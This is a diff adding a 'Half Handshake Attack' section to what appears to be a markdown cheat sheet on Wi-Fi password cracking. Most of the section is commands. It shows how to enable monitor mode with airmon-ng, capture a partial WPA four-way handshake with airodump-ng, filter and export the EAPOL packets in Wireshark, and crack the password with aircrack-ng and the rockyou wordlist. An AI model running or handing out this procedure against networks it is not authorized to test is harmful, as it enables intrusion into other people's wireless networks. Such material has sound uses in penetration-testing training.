@@ -406,4 +406,51 @@ gunzip /usr/share/wordlists/rockyou.txt.gz
 To try opening MyWiFi-01.cap with keys in the dictionary rockyou.txt:
 ```
 aircrack-ng -1 rockyou.txt MyWiFi-01.cap
+
+
+
+
+
+
+
+
+# Half Handshake Attack
+### look up wifi adapter:
 ```
+ifconfig -a
+or
+ip addr
+```
+### Packet monitoring and injection commands:
+```
+airmon-ng check kill
+
+airmon-ng check
+
+airmon-ng start wlan0
+
+airodump-ng wlan0mon
+```
+this will let you see what wifi networks are around to impersonate 
+
+### Capture 2 of 4 packets in a 4 way handshake (don't need all 4) and pipe into wireshark:
+```
+sudo airodump-ng wlan0mon -c 6 & wireshark
+```
+
+##### In wireshark apply filters and export pcap file for cracking
+1. select the interface you are listening on (wlan0mon)
+2. create wireshark filter based on the transmit/recieve mac address of the network you are trying to crack
+	- eapol||wlan.ta==<mac-address>||wlan.da==<mac-address>
+	- need the beacon frame and the first 2 of 4 handshake packets. 
+3. export 
+	- File > Export Specified Packets... > save-file-name.pcap
+4. exit wireshark and airdump-ng
+5. crack the password
+	- ``` aircrack-ng -w '/usr/share/wordlists/rockyou.txt' '/path/to/pcap-file' ```
+
+
+	
+	
+	
+	
